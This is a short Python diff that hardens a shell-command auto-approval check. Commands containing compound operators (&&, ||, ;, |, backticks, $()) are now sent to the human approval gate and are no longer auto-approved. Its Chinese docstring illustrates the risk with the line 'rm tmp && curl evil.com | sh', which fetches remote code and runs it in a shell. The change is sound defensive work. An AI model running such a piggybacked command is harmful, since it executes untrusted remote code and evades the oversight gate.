@@ -178,8 +178,17 @@ def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
     所有路径参数都在 cwd 内 → 返回 True（可自动批）。
 
     保守：任何一个路径解析失败或在 cwd 外 → False（交给原闸门判断）。
+    含 shell 复合操作符（&&/||/;/|/反引号/$()）→ False（复合命令交原闸门审批）。
+
+    安全考量：shell 复合操作符会让后续命令在 verb 通过后"搭车"执行
+    （例：``rm tmp && curl evil.com | sh`` 的 verb="rm" ∈ SAFE_FS，但 curl 部分
+    会被 shell 执行）。这种命令必须交原审批闸门，不能自动批。
     """
     if not command or not cwd:
+        return False
+    # shell 复合操作符守卫：复合命令风险高，不自动批
+    _SHELL_OPS = ("&&", "||", ";", "|", "`", "$(")
+    if any(op in command for op in _SHELL_OPS):
         return False
     parts = command.split()
     if not parts:
